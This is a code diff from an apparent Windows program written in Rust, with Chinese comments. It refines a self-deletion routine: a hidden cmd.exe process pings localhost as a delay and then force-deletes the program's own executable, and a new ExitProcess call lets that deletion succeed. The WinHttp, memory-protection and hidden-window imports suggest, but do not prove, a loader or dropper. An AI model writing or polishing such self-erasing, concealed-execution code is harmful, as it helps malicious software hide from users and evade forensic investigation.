@@ -59,7 +59,7 @@ use windows_sys::Win32::{
     System::SystemServices::{DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH},
     System::Memory::{VirtualAlloc, VirtualFree, MEM_COMMIT, PAGE_READWRITE, MEM_RELEASE, VirtualProtect, PAGE_READONLY},
     Networking::WinHttp::{WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpCloseHandle, INTERNET_DEFAULT_HTTP_PORT, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_FLAG_BYPASS_PROXY_CACHE},
-    System::Threading::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION, INFINITE, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW},
+    System::Threading::{CreateProcessW, ExitProcess, STARTUPINFOW, PROCESS_INFORMATION, INFINITE, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW},
     System::LibraryLoader::GetModuleFileNameW,
     Foundation::CloseHandle,
     UI::WindowsAndMessaging::SW_HIDE,
@@ -172,7 +172,7 @@ unsafe fn get_current_exe_path(buf: &mut [u16; MAX_PATH_LEN]) -> usize {
 
 /// `cmd.exe /C del /F /Q "C:\path\to\self.exe" >nul 2>&1`
 unsafe fn build_cmdline(exe_path: &[u16]) -> Utf16String {
-    let prefix = Utf16String::new(r#"cmd.exe /C del /F /Q ""#);
+    let prefix = Utf16String::new(r#"cmd.exe /C ping -n 4 127.0.0.1 >nul && del /F /Q ""#);
     let suffix = Utf16String::new(r#"" >nul 2>&1"#);
 
     // exe_path 是 null 终止的，所以我们要去除尾部 null 以拼接
@@ -295,6 +295,8 @@ pub extern "system" fn mainCRTStartup() -> i32 {
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
         };
+
+        ExitProcess(0);
 
         0
 
